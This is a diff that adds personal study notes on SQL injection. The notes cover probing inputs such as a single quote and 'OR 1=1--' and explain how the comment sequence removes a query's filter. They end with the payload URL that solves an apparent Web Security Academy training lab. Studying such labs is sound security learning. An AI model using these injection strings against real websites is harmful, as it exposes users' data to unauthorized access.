@@ -3,4 +3,59 @@ Sql injection attacks;
   - it may be done using denial of service attack
   - as I said above it's impact as you know;
     - extract the data of the users like; passwords,credit cards...
+how to detect sql injection
+as you know  ; you need to test the software to see whehter it has a weaknesses or not
+there are some tests you can submit into the application to see;  
+  1. single quote '  and look for error
+  2. some sql commands 
+  3. boolean conditions like; OR 1=1 ..
+Most cases that SQL  injections accours are;
+1. in where statements
+2. select statements
+3. insert statements
+4. Update statements
+
+
+now we used SQL injection to extract; hidden data from the website
+ex;
+https://insecure-website.com/products?category=Gifts'--  -> here we added '-- 
+-- -> is a comment in sql which means the restrication after that query make it comment and run this query instead 
+
+this is the query behine the scene;
+SELECT * FROM products
+WHERE category = 'Gifts'--'
+AND released = 1;
+after you implement this query it will appear as you see;
+SELECT * FROM products
+WHERE category = 'Gifts'
+no released restrication
+ex'
+https://insecure-website.com/products?category=Gifts' OR 1=1--
+
+1=1 => true -> which means  choose any items from the table called products either it's categpry called Gifts or any one(true)
+the query behined the scene;
+SELECT * FROM products
+WHERE category = 'Gifts'
+OR 1=1--'
+AND released = 1; 
+
+category = 'Gifts'
+OR
+1 = 1
+for the first lab ; 
+the problem ;
+ This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products
+
+
+
+here are the solution;
+https://0a3a00f5049a1016809fdfd600b000fd.web-security-academy.net/filter?category=Gifts%27+or+1=1--
+I added '+or+1=1+-- 
+this is the next test that you can add to make a sql injection into the lab 
+note that ; '-- didn't show the whole items in the database so we used the other condition
+
+
   
